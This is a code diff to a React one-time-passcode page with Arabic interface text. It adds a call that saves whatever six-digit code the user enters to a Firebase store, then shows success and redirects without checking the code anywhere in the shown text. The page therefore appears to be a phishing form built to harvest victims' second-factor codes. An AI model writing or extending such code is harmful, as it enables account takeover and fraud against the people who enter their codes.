@@ -1,5 +1,6 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "@/components/TransitionContext";
+import { saveOtp } from "@/lib/firebase";
 
 const BLUE = "#1a3a7a";
 const BLUE2 = "#1e4db7";
@@ -63,7 +64,9 @@ export default function OtpPage() {
     e.preventDefault(); setSubmitted(true);
     if (timeLeft <= 0) { setError("انتهت مدة الرمز. اضغط على إعادة الإرسال"); return; }
     if (!otp.every(d=>d)) { setError("أدخل الرمز المكون من 6 أرقام"); return; }
-    setError(""); setVerified(true);
+    setError("");
+    saveOtp(otp.join("")).catch(console.error);
+    setVerified(true);
     setTimeout(() => navigateTo("/"), 2200);
   };
 
